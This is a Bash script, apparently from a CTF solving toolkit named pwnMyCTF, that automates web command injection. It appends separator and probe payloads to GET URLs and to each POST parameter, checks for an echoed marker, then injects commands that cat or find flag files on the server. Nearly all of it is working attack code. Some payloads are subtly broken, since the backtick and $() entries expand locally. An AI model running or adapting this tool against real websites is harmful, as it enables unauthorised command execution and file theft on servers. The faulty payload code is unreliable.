#!/usr/bin/env bash
# Web command injection solver for pwnMyCTF

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)"
LIB_DIR="${SCRIPT_DIR}/../lib"

source "${LIB_DIR}/http.sh" 2>/dev/null || true
source "${LIB_DIR}/encoding.sh" 2>/dev/null || true
source "${LIB_DIR}/timeout.sh" 2>/dev/null || true

# Common command injection payloads
CMDI_BASIC_PAYLOADS=(
    ";"
    "&"
    "|"
    "||"
    "&&"
    "%0A"  # URL-encoded newline
    "%0D%0A"  # URL-encoded CRLF
    "\n"
    "\r\n"
)

CMDI_TEST_PAYLOADS=(
    "; echo 'cmd_test_12345'"
    "& echo 'cmd_test_12345'"
    "| echo 'cmd_test_12345'"
    "|| echo 'cmd_test_12345'"
    "&& echo 'cmd_test_12345'"
    "`echo 'cmd_test_12345'`"
    "$(echo 'cmd_test_12345')"
)

# Web command injection solver functions
solve_web_cmd() {
    local target="$1"
    local verbose="${2:-0}"
    
    log_verbose 2 "Attempting command injection solve on: $target"
    
    # First, test if the target is vulnerable to basic command injection
    for payload in "${CMDI_TEST_PAYLOADS[@]}"; do
        local test_url="${target}${payload}"
        local response
        if response=$(http_get "$test_url" 2>/dev/null); then
            # Check for evidence of command execution
            if echo "$response" | grep -q "cmd_test_12345"; then
                log_verbose 2 "Found command injection with payload: $payload"
                # Try to extract flag using command injection
                local flag_payload="; cat /flag* 2>/dev/null || find / -name 'flag*' -type f 2>/dev/null | head -1"
                local flag_url="${target}${flag_payload}"
                local flag_response
                if flag_response=$(http_get "$flag_url" 2>/dev/null); then
                    local flag
                    if flag=$(echo "$flag_response" | grep -Eo 'flag\{[^}]+\}|FLAG\{[^}]+\}|CTF\{[^}]+\}' | head -1); then
                        echo "$flag"
                        return 0
                    fi
                fi
            fi
        fi
    done
    
    # Try alternative payloads for different contexts
    local alt_payloads=(
        "'; echo 'cmd_test_12345' #"
        "' && echo 'cmd_test_12345' #"
        "' || echo 'cmd_test_12345' #"
        "\" && echo 'cmd_test_12345' #"
        "\" || echo 'cmd_test_12345' #"
    )
    
    for payload in "${alt_payloads[@]}"; do
        local test_url="${target}${payload}"
        local response
        if response=$(http_get "$test_url" 2>/dev/null); then
            if echo "$response" | grep -q "cmd_test_12345"; then
                log_verbose 2 "Found command injection with alternative payload: $payload"
                # Try to extract flag
                local flag_payload="; cat /flag* 2>/dev/null || find / -name 'flag*' -type f 2>/dev/null | head -1 #"
                local flag_url="${target}${flag_payload}"
                local flag_response
                if flag_response=$(http_get "$flag_url" 2>/dev/null); then
                    local flag
                    if flag=$(echo "$flag_response" | grep -Eo 'flag\{[^}]+\}|FLAG\{[^}]+\}|CTF\{[^}]+\}' | head -1); then
                        echo "$flag"
                        return 0
                    fi
                fi
            fi
        fi
    done
    
    return 1
}

# Also test with POST data
solve_web_cmd_post() {
    local target="$1"
    local post_data="$2"
    local verbose="${3:-0}"
    
    log_verbose 2 "Attempting command injection POST solve on: $target"
    
    # Parse POST data to inject into each parameter
    local params=()
    IFS='&' read -ra ADDR <<< "$post_data"
    for pair in "${ADDR[@]}"; do
        params+=("$pair")
    done
    
    # For each parameter, try command injection payloads
    for payload in "${CMDI_TEST_PAYLOADS[@]}"; do
        for i in "${!params[@]}"; do
            local original="${params[$i]}"
            params[$i]="${original}${payload}"
            
            # Build new POST data
            local new_post=""
            for j in "${!params[@]}"; do
                if [[ $j -gt 0 ]]; then
                    new_post+="&"
                fi
                new_post+="${params[$j]}"
            done
            
            local response
            if response=$(http_post "$target" "$new_post" 2>/dev/null); then
                # Check for evidence of command execution
                if echo "$response" | grep -q "cmd_test_12345"; then
                    log_verbose 2 "Found command injection in POST with payload: $payload"
                    # Try to extract flag
                    local flag_payload="; cat /flag* 2>/dev/null || find / -name 'flag*' -type f 2>/dev/null | head -1"
                    local flag_params=()
                    for j in "${!params[@]}"; do
                        flag_params+=("${params[$j]}${flag_payload}")
                    done
                    local flag_post=""
                    for j in "${!flag_params[@]}"; do
                        if [[ $j -gt 0 ]]; then
                            flag_post+="&"
                        fi
                        flag_post+="${flag_params[$j]}"
                    done
                    local flag_response
                    if flag_response=$(http_post "$target" "$flag_post" 2>/dev/null); then
                        local flag
                        if flag=$(echo "$flag_response" | grep -Eo 'flag\{[^}]+\}|FLAG\{[^}]+\}|CTF\{[^}]+\}' | head -1); then
                            echo "$flag"
                            return 0
                        fi
                    fi
                fi
                
                # Restore original parameter
                params[$i]="$original"
            fi
        done
    done
    
    return 1
}

# Export functions
export -f solve_web_cmd
export -f solve_web_cmd_post